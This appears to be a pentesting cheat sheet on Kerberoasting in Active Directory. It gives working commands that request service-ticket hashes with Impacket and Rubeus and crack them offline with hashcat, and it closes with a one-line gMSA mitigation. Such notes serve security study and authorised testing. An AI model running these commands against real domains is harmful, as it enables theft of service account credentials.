---
TitleSEO:    "Kerberoasting Attack Guide | ZureFX"
TitlePost:   "Kerberoasting — Active Directory"
Author:      "ZureFX"
Description: "Kerberoasting attack explained: how to request TGS tickets, extract hashes and crack service account passwords offline."
Keywords:    "kerberoasting, active directory, impacket, hashcat, kerberos, pentesting"
URL:         "https://zurefx.github.io/notes/ad-kerberoasting.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/notes/ad-kerberoasting/"
Date:        "2026-03-18"
Tags:        "ActiveDirectory, Kerberoasting, CheatSheet, Impacket"
Section:     "notes"
Subsection:  "Active Directory"
Lang:        "en"
main_img:    "ad-kerberoasting"
Permalink:   "/notes/ad-kerberoasting.html"
BtnLabel:    "View CheatSheet"
---

## What is Kerberoasting?

Any domain user can request a TGS ticket for any service. The ticket is encrypted with the service account's NTLM hash → crackable offline.

## Extract Tickets

```bash
# Impacket
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast

# Rubeus (from Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

## Crack with Hashcat

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.kerberoast rockyou.txt --rules-file best64.rule
```

## Mitigation

Use Group Managed Service Accounts (gMSA) — 120-char random passwords, uncrackable.
